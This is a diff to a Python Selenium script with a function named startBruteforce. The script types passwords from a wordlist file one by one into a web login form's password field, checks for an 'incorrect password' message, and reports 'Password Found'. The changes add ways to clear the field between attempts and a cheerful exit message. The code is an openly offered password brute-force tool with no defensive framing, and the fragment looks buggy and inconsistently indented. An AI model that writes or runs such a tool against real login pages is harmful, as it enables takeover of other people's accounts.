@@ -68,13 +68,25 @@ def startBruteforce(driver):
                     for line in file:
                      passwordField.send_keys(line)
                      print(f"Trying Password {line}")
+                     print("Before clearing:", passwordField.get_attribute("value"))
+                     time.sleep(1)
+                     passwordField.click()
+                     passwordField.clear()
+                     driver.execute_script("arguments[0].focus();", passwordField)
+                     driver.execute_script("arguments[0].value = '';", passwordField)
                      time.sleep(3)
                      if "Sorry, your password was incorrect" in loginpage_source:
-                         print("Invalid Password")
+                        passwordField.clear()
+                        driver.execute_script("arguments[0].focus();", passwordField)
+                        driver.execute_script("arguments[0].value = '';", passwordField)
+                        print("Invalid Password")
                     else:
                         print(f"Password Found {line} ") 
+                    #  if "Sorry, your password was incorrect" in loginpage_source:
+                    
             except BaseException:
-                print("User Interrupted or any other random error")
+                print("User Interrupted or any other random error\n")
+                print(f"\033[92m Closing the program. Have a nice day, My dear sir :) \033[0m")
             submitButton = WebDriverWait(
                 driver, 10).until(
                 EC.visibility_of_element_located(
